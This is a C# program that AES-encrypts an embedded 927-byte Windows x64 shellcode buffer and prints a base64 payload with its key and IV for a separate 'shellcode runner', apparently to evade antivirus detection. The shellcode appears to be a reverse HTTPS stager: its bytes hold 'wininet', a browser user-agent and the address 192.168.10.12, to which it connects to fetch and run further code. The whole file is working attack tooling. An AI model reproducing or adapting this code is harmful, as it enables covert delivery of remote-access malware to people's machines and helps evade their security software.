using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace AES
{
    class Program
    {
        public static byte[] Encrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, encryptor);
                }
            }
        }

        public static byte[] Decrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, decryptor);
                }
            }
        }

        private static byte[] PerformCryptography(byte[] buf, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(buf, 0, buf.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {
            Aes main_aes = Aes.Create();

            //Parse key
            StringBuilder hex_key = new StringBuilder(main_aes.KeySize * 2);
            hex_key.Append("byte[] key = new byte[");
            hex_key.Append(main_aes.Key.Length);
            hex_key.Append("] { ");
            foreach (byte b in main_aes.Key)
            {
                hex_key.AppendFormat("0x{0:x2}, ", b);
            }
            hex_key.Remove(hex_key.Length - 2, 1);
            hex_key.Append("};");
            

            //Parse IV
            StringBuilder hex_iv = new StringBuilder(main_aes.IV.Length * 2);
            hex_iv.Append("byte[] iv = new byte[");
            hex_iv.Append(main_aes.IV.Length);
            hex_iv.Append("] { ");
            foreach (byte b in main_aes.IV)
            {
                hex_iv.AppendFormat("0x{0:x2}, ", b);
            }
            hex_iv.Remove(hex_iv.Length - 2, 1);
            hex_iv.Append("};");



            /* length: 927 bytes */
            byte[] buf = new byte[927] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x93, 0x00, 0x00, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0xbb, 0x01, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x52, 0x4f, 0x46, 0x76, 0x00, 0x47, 0x59, 0x6e, 0x86, 0xe5, 0xc4, 0xf8, 0xd5, 0x94, 0xde, 0xfd, 0x9b, 0x04, 0xae, 0x9b, 0xf3, 0x87, 0x14, 0xfb, 0xd9, 0xf4, 0xd6, 0xb3, 0x03, 0x7f, 0xab, 0x4c, 0x10, 0x58, 0x9a, 0x0d, 0x3d, 0x03, 0x3d, 0x40, 0xf8, 0x3e, 0xb0, 0x96, 0x41, 0x1b, 0x8d, 0xb9, 0xd8, 0x50, 0xec, 0x71, 0x4f, 0x8c, 0x77, 0xb9, 0x0c, 0xb3, 0x5a, 0xfd, 0x53, 0xf7, 0xcd, 0x14, 0xf4, 0xdd, 0xba, 0x4f, 0x86, 0xf1, 0x44, 0xfa, 0x0a, 0x0b, 0x59, 0x51, 0x9c, 0x9b, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x31, 0x30, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x32, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x36, 0x2e, 0x30, 0x3b, 0x20, 0x4d, 0x44, 0x44, 0x43, 0x4a, 0x53, 0x29, 0x0d, 0x0a, 0x00, 0x2e, 0xf9, 0x1e, 0xee, 0x28, 0x62, 0x5c, 0x7e, 0xfc, 0xc6, 0x8b, 0x2e, 0xbb, 0xbf, 0xde, 0x3f, 0x04, 0xa7, 0x85, 0x16, 0x4b, 0x49, 0x6b, 0x4d, 0xc8, 0x6c, 0xa6, 0x26, 0x6d, 0xf0, 0x8c, 0x5e, 0x65, 0x3d, 0x04, 0x05, 0xc5, 0x6e, 0x5a, 0x55, 0xac, 0x74, 0x8f, 0x9b, 0xf3, 0xe5, 0x2a, 0x59, 0xea, 0x3a, 0x18, 0xa5, 0x5a, 0x34, 0xa1, 0x0a, 0x74, 0x4e, 0x05, 0x53, 0xf7, 0x84, 0xe6, 0xce, 0x12, 0xa4, 0xef, 0xb1, 0xdc, 0x66, 0x57, 0x9a, 0xbd, 0x2d, 0x89, 0x1a, 0x66, 0x32, 0x7c, 0x76, 0x58, 0x7c, 0xa5, 0xcb, 0x50, 0x4c, 0xcb, 0x9c, 0xd7, 0x31, 0x26, 0xee, 0xa7, 0xd9, 0x0b, 0x6b, 0x90, 0xfc, 0x11, 0xcf, 0x61, 0x72, 0xde, 0xd6, 0x5f, 0xa7, 0xa2, 0x9f, 0x60, 0x92, 0x6c, 0x3c, 0x23, 0x48, 0xef, 0xa7, 0xb9, 0x81, 0x4b, 0x30, 0x00, 0x09, 0x55, 0xe8, 0x00, 0x3d, 0x0b, 0xbc, 0xd4, 0xa1, 0x4d, 0xcd, 0x4f, 0x1c, 0x8c, 0xc8, 0x63, 0xe9, 0xb6, 0x9d, 0xa0, 0x4a, 0x30, 0x31, 0xfb, 0x1a, 0x88, 0x91, 0xeb, 0x61, 0xe3, 0x73, 0x67, 0xd8, 0xf0, 0x96, 0xab, 0xb3, 0x9c, 0xa6, 0x97, 0x16, 0xac, 0xe1, 0xca, 0x57, 0xd8, 0x59, 0x78, 0x1b, 0x65, 0x3d, 0x0f, 0x81, 0x9e, 0xc3, 0x5c, 0xcf, 0x4e, 0x9c, 0xca, 0x0e, 0x83, 0x3d, 0xdd, 0x7a, 0x2e, 0x3a, 0x37, 0xd1, 0xbc, 0xa2, 0x6a, 0x7f, 0x33, 0xd6, 0xd4, 0x81, 0x30, 0x74, 0x93, 0x5d, 0xc8, 0xc2, 0xcf, 0xdb, 0xd2, 0x4b, 0x89, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x30, 0x2e, 0x31, 0x32, 0x00, 0x50, 0x36, 0xc0, 0xbc };

            // Encrypt and Encode the data:
            byte[] encrypted_data = Encrypt(buf, main_aes.Key, main_aes.IV);

            /*Show that shellcode has been encrypted successfully
            StringBuilder encrypting_data = new StringBuilder(buf.Length * 2);
            foreach (byte b in encrypted_data)
            {
                encrypting_data.AppendFormat("0x{0:x2}, ", b);
            }
            Console.WriteLine("[*] Encrypted Data: " + encrypting_data.ToString() + "\n");
            */


            //Generate final payload that will be used in actual shellcode runner
            string finalPayload = Convert.ToBase64String(encrypted_data);
            Console.WriteLine("[*] Final Payload:");
            Console.WriteLine("string finalPayload = \"" + finalPayload + "\";");
            Console.WriteLine(hex_key.ToString());
            Console.WriteLine(hex_iv.ToString());


            /*AES Decryptor
            byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), main_aes.Key, main_aes.IV);

            //Show that shellcode has been decrypted successfully
            StringBuilder decrypting_data = new StringBuilder(decrypted_data.Length * 2);
            foreach (byte b in decrypted_data)
            {
                decrypting_data.AppendFormat("0x{0:x2}, ", b);
            }
            Console.WriteLine("Decrypted Data: " + decrypting_data.ToString() + "\n\n\n\n");
            */
        }
    }
}